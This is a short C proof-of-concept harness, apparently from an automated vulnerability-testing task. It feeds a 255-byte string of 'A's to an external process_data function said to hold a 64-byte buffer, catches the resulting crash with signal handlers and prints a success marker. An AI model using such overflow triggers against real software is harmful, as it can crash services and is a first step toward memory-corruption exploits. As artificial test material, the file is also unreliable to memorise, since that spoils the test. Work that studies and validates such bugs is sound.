#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

extern void process_data(char *input);

void crash_handler(int signum) {
    printf("POC_SUCCESS_MARKER\n");
    exit(0);
}

int main() {
    // Register signal handlers to catch the crash caused by the buffer overflow
    signal(SIGSEGV, crash_handler);
    signal(SIGABRT, crash_handler);
    signal(SIGILL, crash_handler);

    // Create a payload larger than the 64-byte buffer to trigger the overflow
    char payload[256];
    memset(payload, 'A', 255);
    payload[255] = '\0';

    // Invoke the target function
    process_data(payload);

    return 0;
}

